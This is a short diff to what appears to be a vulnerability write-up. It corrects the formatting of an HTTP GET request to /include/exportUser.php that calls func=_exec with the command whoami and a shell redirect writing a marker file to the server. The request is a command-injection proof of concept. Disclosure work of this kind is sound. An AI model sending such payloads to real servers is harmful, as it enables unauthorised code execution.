@@ -128,8 +128,7 @@ After executing this request, we have a file named "test.txt" in "/include" dire
 
 
 ```http  
-GET /include/exportUser.php?type=3&cla=application&func=_exec&opt=whoami&echo "erkan" > test.txt
-HTTP/1.1
+GET /include/exportUser.php?type=3&cla=application&func=_exec&opt=whoami&echo "erkan" > test.txt HTTP/1.1
 Host: theSuspect:8181
 Connection: keep-alive
 User-Agent: the UA
